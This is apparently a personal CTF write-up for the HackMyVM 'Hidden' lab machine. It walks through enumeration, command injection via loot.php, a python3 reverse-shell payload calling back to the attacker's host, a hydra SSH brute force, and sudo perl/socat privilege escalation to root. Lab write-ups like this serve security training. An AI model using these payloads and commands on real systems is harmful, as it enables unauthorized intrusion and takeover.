@@ -1,1 +1,483 @@
+			ENUMERATION
+			
 
+---nmap---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.58 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 16:29 +03
+Nmap scan report for 10.0.2.58
+Host is up (0.00079s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b8:10:9f:60:e6:2b:62:cb:3a:8c:8c:60:4b:1d:99:b9 (RSA)
+|   256 64:b5:b8:e6:0f:79:23:4d:4a:c0:9b:0f:a7:75:67:c9 (ECDSA)
+|_  256 d1:11:e4:07:8a:fe:06:72:64:62:28:ca:e3:29:7b:a0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Level 1
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:04:7B:3B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.79 ms 10.0.2.58
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.91 seconds
+       
+
+
+---open ssh and http ports, dirb and gobuster scans didn't give anything---
+
+
+
+---I checked the website, there is a text "LEVEL 1" and a png file, downloaded the file and checked the file type
+and contents---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/31- HIDDEN LINUX CTF]
+└─# file decodethis_pls.png
+decodethis_pls.png: PNG image data, 333 x 90, 8-bit/color RGBA, non-interlaced
+   
+                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/31- HIDDEN LINUX CTF]
+└─# strings decodethis_pls.png
+IHDR
+zTXtRaw profile type exif
+@:__
+\	i}m
+W8QRK+)
+p|j-
+#GO;
+gUPe
+.
+.
+.
+
+
+
+---not much comes from here, but when we check the image, we see it looks like kind of a cipher, I search for it---
+
+
+---I find out that it is a rosicrucian cipher and our text says "syshiddenhmv"---
+
+
+---I add sys.hidden.hmv to our dns server---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nano /etc/hosts
+                                                                                                           
+┌──(root㉿kali)-[/home/okina]
+└─# cat /etc/hosts         
+.
+.
+.
+
+10.0.2.58	sys.hidden.hmv
+
+
+
+
+---then visit the website http://sys.hidden.hmv---
+
+
+
+---We see an upside down world map that shows the pacific ocean in stars. I download it---
+
+
+---I check it's content also, can't find much. Now that we have a new domain let's scan it---
+
+
+
+                                                                                                          
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://sys.hidden.hmv -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php,css 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://sys.hidden.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,css
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 279]
+/index.html           (Status: 200) [Size: 282]
+/users                (Status: 301) [Size: 316] [--> http://sys.hidden.hmv/users/]
+/members              (Status: 301) [Size: 318] [--> http://sys.hidden.hmv/members/]
+/weapon               (Status: 301) [Size: 317] [--> http://sys.hidden.hmv/weapon/]
+/.html                (Status: 403) [Size: 279]
+/server-status        (Status: 403) [Size: 279]
+Progress: 661680 / 661683 (100.00%)
+===============================================================
+Finished
+===============================================================
+       
+
+
+---okay, we have new hidden pages. The pages users shows an apt-get command and members shows a webp image.
+Not much come from those, the page weapon looks empty however. Let's scan it---
+
+
+
+                                                                                                           
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://sys.hidden.hmv/weapon -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php,css
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://sys.hidden.hmv/weapon
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,css
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 0]
+/.html                (Status: 403) [Size: 279]
+/.php                 (Status: 403) [Size: 279]
+/loot.php             (Status: 200) [Size: 0]
+/.php                 (Status: 403) [Size: 279]
+/.html                (Status: 403) [Size: 279]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+               
+
+
+---we see a new page, loot.php, it also is a blank page but this gives us an idea, since this is a php file maybe
+we can exploit it and execute remote commands---
+
+
+---to do so we can wfuzz tool, I will try to execute whoami command, if it works this means we can achieve
+RCE---
+
+
+
+
+---For this we can use WFUZZ which is a web application bruteforcer tool---
+
+
+                                                                                                           
+┌──(root㉿kali)-[/home/okina]
+└─# wfuzz -c -w /usr/share/wordlists/dirb/big.txt -u http://sys.hidden.hmv/weapon/loot.php?FUZZ=whoami --hw 0
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://sys.hidden.hmv/weapon/loot.php?FUZZ=whoami
+Total requests: 20469
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                   
+=====================================================================
+
+000008723:   200        1 L      1 W        9 Ch        "hack"                                    
+
+Total time: 23.79762
+Processed Requests: 20469
+Filtered Requests: 20468
+Requests/sec.: 860.1279
+
+                    
+
+---it worked, we can perform rce---
+
+
+---when I type this into the url---
+
+http://sys.hidden.hmv/weapon/loot.php?hack=whoami;id;hostname
+
+
+
+---I get this---
+
+www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) hidden 
+
+
+
+---so let's set up a listener from our kali and open a connection from the url---
+
+
+                                                                                                          
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 1234     
+listening on [any] 1234 ...
+
+
+
+---create/use a reverse shell, I will use python3 based---
+
+export RHOST="10.0.2.54";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+
+
+
+---so our final url will look like---
+
+http://sys.hidden.hmv/weapon/loot.php?hack=export RHOST="10.0.2.54";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+                                                                                                           
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 1234     
+listening on [any] 1234 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.58] 37570
+www-data@hidden:/var/www/hidden/weapon$ cd ~
+cd ~
+www-data@hidden:/var/www$ ls
+ls
+hidden	html
+www-data@hidden:/var/www$ cd hidden
+cd hidden
+www-data@hidden:/var/www/hidden$ ls
+ls
+index.html  mapascii.jpg  members  users  weapon
+www-data@hidden:/var/www/hidden$ 
+
+
+---here we gain our first foothold, let's search around---
+
+
+
+www-data@hidden:/$ cd home
+cd home
+www-data@hidden:/home$ ls
+ls
+atenea	toreto
+www-data@hidden:/home$ cd atenea
+cd atenea
+www-data@hidden:/home/atenea$ ls
+ls
+user.txt
+www-data@hidden:/home/atenea$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@hidden:/home/atenea$ cd ..
+cd ..
+www-data@hidden:/home$ cd toreto
+cd toreto
+www-data@hidden:/home/toreto$ ls
+ls
+
+
+
+---not much comes, try SUID permissions---
+
+www-data@hidden:/home$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on hidden:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on hidden:
+    (toreto) NOPASSWD: /usr/bin/perl
+
+
+
+---www-data can run perl and become toreto. Checked gtfobins for a priv escalate vector, found one. 
+Let's use it to become the user toreto---
+
+			
+sudo -u toreto /usr/bin/perl -e 'exec "/bin/sh";'
+$ whoami
+whoami
+toreto
+$ cd /home
+cd /home
+$ ls
+ls
+atenea	toreto
+
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+
+toreto@hidden:~$ pwd
+pwd
+/home/toreto
+
+
+toreto@hidden:~$ cd ..
+cd ..
+toreto@hidden:/home$ cd ate	
+cd atenea/
+toreto@hidden:/home/atenea$ ls -la
+ls -la
+total 36
+drwxr-xr-x 4 atenea atenea 4096 May 23  2021 .
+drwxr-xr-x 4 root   root   4096 May 24  2021 ..
+-rw------- 1 atenea atenea    1 May 25  2021 .bash_history
+-rw-r--r-- 1 atenea atenea  220 May 22  2021 .bash_logout
+-rw-r--r-- 1 atenea atenea 3526 May 22  2021 .bashrc
+drwxr-xr-x 2 atenea atenea 4096 May 22  2021 .hidden
+drwxr-xr-x 3 atenea atenea 4096 May 23  2021 .local
+-rw-r--r-- 1 atenea atenea  807 May 22  2021 .profile
+-rw------- 1 atenea atenea   63 May 23  2021 user.txt
+toreto@hidden:/home/atenea$ 
+
+
+
+---we discover a file named .hidden, lets check it---
+
+
+
+toreto@hidden:/home/atenea$ cd .hidden
+cd .hidden
+toreto@hidden:/home/atenea/.hidden$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 atenea atenea 4096 May 22  2021 .
+drwxr-xr-x 4 atenea atenea 4096 May 23  2021 ..
+-rw------- 1 toreto toreto 6170 May 22  2021 atenea.txt
+toreto@hidden:/home/atenea/.hidden$ cat atenea.txt
+.
+.
+.
+sys8503hmv
+sys8504hmv
+sys8505hmv
+sys8506hmv
+sys8507hmv
+sys8508hmv
+sys8509hmv
+sys8510hmv
+sys8511hmv
+sys8512hmv
+sys8513hmv
+sys8514hmv
+sys8515hmv
+sys8516hmv
+.
+.
+.
+ ---here are possibly the passwords that belong to atenea, so let's utilize a bruteforce attack to gain access
+to the ssh server as atenea using this password list---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/31- HIDDEN LINUX CTF]
+└─# hydra -l atenea -P atenea.txt ssh://10.0.2.58
+ 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-13 19:20:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 561 login tries (l:1/p:561), ~36 tries per task
+[DATA] attacking ssh://10.0.2.58:22/
+[STATUS] 160.00 tries/min, 160 tries in 00:01h, 401 to do in 00:03h, 16 active
+[STATUS] 112.00 tries/min, 336 tries in 00:03h, 225 to do in 00:03h, 16 active
+
+[22][ssh] host: 10.0.2.58   login: atenea   password: sys8423hmv
+
+
+
+---found the password, lets go---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh atenea@10.0.2.58                         
+
+atenea@10.0.2.58's password: 
+Linux hidden 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+     _________
+    / ======= \
+   / __________\
+  | ___________ |
+  | | -       | |
+  | |         | |
+  | |_________| |  ___________________
+  \=____________/  Hack_My_VM - Hidden 
+  / """"""""""" \  -------------------                     
+ / ::::::::::::: \                  
+(_________________)
+
+---------------------------------------------------
+Congratulations!!! you have reached the last level!
+Good Luck! ;)
+---------------------------------------------------
+
+Last login: Tue May 25 10:17:05 2021 from 192.168.0.20
+
+
+---we are in as atenea, let's get the first flag---
+
+
+atenea@hidden:~$ pwd
+/home/atenea
+atenea@hidden:~$ ls
+user.txt
+atenea@hidden:~$ cat user.txt
+--------------------
+---First User Flag---
+--------------------
+
+
+
+---let's try to become root and get the final flag now---
+
+
+
+
+			PRIVILEGE ESCALATION
+
+
+atenea@hidden:~$ sudo -l
+Matching Defaults entries for atenea on hidden:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User atenea may run the following commands on hidden:
+    (root) NOPASSWD: /usr/bin/socat
+
+
+
+---check gtfobins and we find a priv escalate vector---
+
+
+
+atenea@hidden:~$ sudo socat stdin exec:/bin/sh
+whoami
+root
+
+
+---That was easy, let's get that flag---
+
+
+
+cd /root
+ls
+root.txt
+cat root.txt
+--------------------
+---Root User Flag---
+--------------------
